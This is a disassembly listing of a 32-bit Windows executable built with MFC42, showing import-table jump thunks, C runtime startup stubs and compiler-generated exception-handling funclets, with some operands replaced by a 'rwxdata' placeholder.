Ordinal_MFC42_4589
jmp [ Ordinal_MFC42_4589@IAT ]
Ordinal_MFC42_4899
jmp [ Ordinal_MFC42_4899@IAT ]
Ordinal_MFC42_5076
jmp [ Ordinal_MFC42_5076@IAT ]
Ordinal_MFC42_4341
jmp [ Ordinal_MFC42_4341@IAT ]
Ordinal_MFC42_4349
jmp [ Ordinal_MFC42_4349@IAT ]
Ordinal_MFC42_4723
jmp [ Ordinal_MFC42_4723@IAT ]
Ordinal_MFC42_4890
jmp [ Ordinal_MFC42_4890@IAT ]
Ordinal_MFC42_4531
jmp [ Ordinal_MFC42_4531@IAT ]
Ordinal_MFC42_4545
jmp [ Ordinal_MFC42_4545@IAT ]
Ordinal_MFC42_4543
jmp [ Ordinal_MFC42_4543@IAT ]
Ordinal_MFC42_4526
jmp [ Ordinal_MFC42_4526@IAT ]
Ordinal_MFC42_4529
jmp [ Ordinal_MFC42_4529@IAT ]
Ordinal_MFC42_4524
jmp [ Ordinal_MFC42_4524@IAT ]
Ordinal_MFC42_4964
jmp [ Ordinal_MFC42_4964@IAT ]
Ordinal_MFC42_4961
jmp [ Ordinal_MFC42_4961@IAT ]
Ordinal_MFC42_4108
jmp [ Ordinal_MFC42_4108@IAT ]
Ordinal_MFC42_6055
jmp [ Ordinal_MFC42_6055@IAT ]
Ordinal_MFC42_1776
jmp [ Ordinal_MFC42_1776@IAT ]
Ordinal_MFC42_5240
jmp [ Ordinal_MFC42_5240@IAT ]
Ordinal_MFC42_5290
jmp [ Ordinal_MFC42_5290@IAT ]
Ordinal_MFC42_3748
jmp [ Ordinal_MFC42_3748@IAT ]
Ordinal_MFC42_1726
jmp [ Ordinal_MFC42_1726@IAT ]
Ordinal_MFC42_4432
jmp [ Ordinal_MFC42_4432@IAT ]
Ordinal_MFC42_560
jmp [ Ordinal_MFC42_560@IAT ]
Ordinal_MFC42_813
jmp [ Ordinal_MFC42_813@IAT ]
Ordinal_MFC42_5260
jmp [ Ordinal_MFC42_5260@IAT ]
Ordinal_MFC42_3663
jmp [ Ordinal_MFC42_3663@IAT ]
Ordinal_MFC42_3571
jmp [ Ordinal_MFC42_3571@IAT ]
Ordinal_MFC42_3573
jmp [ Ordinal_MFC42_3573@IAT ]
Ordinal_MFC42_3693
jmp [ Ordinal_MFC42_3693@IAT ]
Ordinal_MFC42_3626
jmp [ Ordinal_MFC42_3626@IAT ]
Ordinal_MFC42_640
jmp [ Ordinal_MFC42_640@IAT ]
Ordinal_MFC42_2405
jmp [ Ordinal_MFC42_2405@IAT ]
Ordinal_MFC42_2414
jmp [ Ordinal_MFC42_2414@IAT ]
Ordinal_MFC42_5787
jmp [ Ordinal_MFC42_5787@IAT ]
Ordinal_MFC42_5788
jmp [ Ordinal_MFC42_5788@IAT ]
Ordinal_MFC42_2753
jmp [ Ordinal_MFC42_2753@IAT ]
Ordinal_MFC42_5785
jmp [ Ordinal_MFC42_5785@IAT ]
Ordinal_MFC42_1641
jmp [ Ordinal_MFC42_1641@IAT ]
Ordinal_MFC42_1640
jmp [ Ordinal_MFC42_1640@IAT ]
Ordinal_MFC42_323
jmp [ Ordinal_MFC42_323@IAT ]
Ordinal_MFC42_2535
jmp [ Ordinal_MFC42_2535@IAT ]
Ordinal_MFC42_2379
jmp [ Ordinal_MFC42_2379@IAT ]
Ordinal_MFC42_4464
jmp [ Ordinal_MFC42_4464@IAT ]
Ordinal_MFC42_2723
jmp [ Ordinal_MFC42_2723@IAT ]
Ordinal_MFC42_2390
jmp [ Ordinal_MFC42_2390@IAT ]
Ordinal_MFC42_3059
jmp [ Ordinal_MFC42_3059@IAT ]
Ordinal_MFC42_5100
jmp [ Ordinal_MFC42_5100@IAT ]
Ordinal_MFC42_5103
jmp [ Ordinal_MFC42_5103@IAT ]
Ordinal_MFC42_4467
jmp [ Ordinal_MFC42_4467@IAT ]
Ordinal_MFC42_4303
jmp [ Ordinal_MFC42_4303@IAT ]
Ordinal_MFC42_3350
jmp [ Ordinal_MFC42_3350@IAT ]
Ordinal_MFC42_5012
jmp [ Ordinal_MFC42_5012@IAT ]
Ordinal_MFC42_975
jmp [ Ordinal_MFC42_975@IAT ]
Ordinal_MFC42_5472
jmp [ Ordinal_MFC42_5472@IAT ]
Ordinal_MFC42_3403
jmp [ Ordinal_MFC42_3403@IAT ]
Ordinal_MFC42_2879
jmp [ Ordinal_MFC42_2879@IAT ]
Ordinal_MFC42_2878
jmp [ Ordinal_MFC42_2878@IAT ]
Ordinal_MFC42_4151
jmp [ Ordinal_MFC42_4151@IAT ]
Ordinal_MFC42_4077
jmp [ Ordinal_MFC42_4077@IAT ]
Ordinal_MFC42_5237
jmp [ Ordinal_MFC42_5237@IAT ]
Ordinal_MFC42_5282
jmp [ Ordinal_MFC42_5282@IAT ]
Ordinal_MFC42_2649
jmp [ Ordinal_MFC42_2649@IAT ]
Ordinal_MFC42_1665
jmp [ Ordinal_MFC42_1665@IAT ]
Ordinal_MFC42_4436
jmp [ Ordinal_MFC42_4436@IAT ]
Ordinal_MFC42_4427
jmp [ Ordinal_MFC42_4427@IAT ]
Ordinal_MFC42_796
jmp [ Ordinal_MFC42_796@IAT ]
Ordinal_MFC42_674
jmp [ Ordinal_MFC42_674@IAT ]
Ordinal_MFC42_554
jmp [ Ordinal_MFC42_554@IAT ]
Ordinal_MFC42_529
jmp [ Ordinal_MFC42_529@IAT ]
Ordinal_MFC42_366
jmp [ Ordinal_MFC42_366@IAT ]
Ordinal_MFC42_807
jmp [ Ordinal_MFC42_807@IAT ]
Ordinal_MFC42_2494
jmp [ Ordinal_MFC42_2494@IAT ]
Ordinal_MFC42_2627
jmp [ Ordinal_MFC42_2627@IAT ]
Ordinal_MFC42_2626
jmp [ Ordinal_MFC42_2626@IAT ]
Ordinal_MFC42_6000
jmp [ Ordinal_MFC42_6000@IAT ]
Ordinal_MFC42_2117
jmp [ Ordinal_MFC42_2117@IAT ]
Ordinal_MFC42_4163
jmp [ Ordinal_MFC42_4163@IAT ]
Ordinal_MFC42_6625
jmp [ Ordinal_MFC42_6625@IAT ]
Ordinal_MFC42_4457
jmp [ Ordinal_MFC42_4457@IAT ]
Ordinal_MFC42_5252
jmp [ Ordinal_MFC42_5252@IAT ]
Ordinal_MFC42_4284
jmp [ Ordinal_MFC42_4284@IAT ]
sub_405d78
cmp [ rwxdata ] 0xffffffff
jne rwxdata
push rwxdata
push rwxdata
push [ esp + 0xc ]
call __dllonexit
add esp 0xc
retn
push [ esp + 0x4 ]
call [ _onexit@IAT ]
pop ecx
retn
sub_405da4
push [ esp + 0x4 ]
call sub_405d78
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
_except_handler3
jmp [ _except_handler3@IAT ]
__dllonexit
jmp [ __dllonexit@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_405f36
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_405f48
xor eax eax
retn
sub_405f4b
retn
_controlfp
jmp [ _controlfp@IAT ]
sub_405f52
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call Ordinal_MFC42_1576
retn 0x10
j_sub_405f98
jmp sub_405f98
sub_405f98
push 0x600
push 0x0
call sub_405f6a
mov [ rwxdata ] al
retn
Ordinal_MFC42_1576
jmp [ Ordinal_MFC42_1576@IAT ]
Ordinal_MFC42_1168
jmp [ Ordinal_MFC42_1168@IAT ]
sub_405fc0
mov eax [ ebp - 0x138 ]
push eax
call sub_404270
retn
sub_405fcd
lea ecx [ ebp - 0x134 ]
jmp Ordinal_MFC42_617
sub_405fd8
mov eax rwxdata
jmp __CxxFrameHandler
sub_405ff0
lea ecx [ ebp - 0x6c ]
jmp sub_4041e0
sub_405ff8
mov eax rwxdata
jmp __CxxFrameHandler
sub_406010
mov eax [ ebp - 0x10 ]
push eax
call sub_404270
retn
sub_40601a
mov eax rwxdata
jmp __CxxFrameHandler
sub_406030
mov eax [ ebp - 0x10 ]
push eax
call sub_404270
retn
sub_40603a
mov eax rwxdata
jmp __CxxFrameHandler
sub_406050
lea ecx [ ebp - 0x3c ]
jmp sub_4054f0
sub_406058
lea ecx [ ebp - 0x1c ]
jmp Ordinal_MFC42_640
sub_406060
lea ecx [ ebp - 0x44 ]
jmp sub_405410
sub_406068
lea ecx [ ebp - 0x4c ]
jmp sub_405480
sub_406070
lea ecx [ ebp - 0x24 ]
jmp sub_405480
sub_406078
lea ecx [ ebp - 0x2c ]
jmp sub_405480
sub_406080
lea ecx [ ebp - 0x34 ]
jmp sub_405480
sub_406088
lea ecx [ ebp - 0x34 ]
jmp sub_405370
sub_406090
lea ecx [ ebp - 0x2c ]
jmp sub_405370
sub_406098
lea ecx [ ebp - 0x24 ]
jmp sub_405370
sub_4060a0
lea ecx [ ebp - 0x4c ]
jmp sub_405370
sub_4060a8
lea ecx [ ebp - 0x44 ]
jmp sub_405370
sub_4060b0
lea ecx [ ebp - 0x3c ]
jmp sub_405370
sub_4060b8
mov eax rwxdata
jmp __CxxFrameHandler
sub_4060d0
mov ecx [ ebp - 0x10 ]
jmp sub_405370
sub_4060d8
mov eax rwxdata
jmp __CxxFrameHandler
sub_4060f0
mov ecx [ ebp - 0x10 ]
jmp sub_405370
sub_4060f8
mov eax rwxdata
jmp __CxxFrameHandler
sub_406110
mov ecx [ ebp - 0x10 ]
jmp sub_405370
sub_406118
mov eax rwxdata
jmp __CxxFrameHandler
sub_406130
mov ecx [ ebp - 0x10 ]
jmp sub_405370
sub_406138
mov eax rwxdata
jmp __CxxFrameHandler
sub_406150
mov eax [ ebp - 0x10 ]
push eax
call sub_404270
retn
sub_40615a
mov eax rwxdata
jmp __CxxFrameHandler
sub_406170
mov ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_674
sub_406178
mov ecx [ ebp - 0x10 ]
add ecx 0xc0
jmp Ordinal_MFC42_796
sub_406186
mov eax rwxdata
jmp __CxxFrameHandler
sub_406190
mov ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_674
sub_406198
mov ecx [ ebp - 0x10 ]
add ecx 0xc0
jmp Ordinal_MFC42_796
sub_4061a6
mov eax rwxdata
jmp __CxxFrameHandler
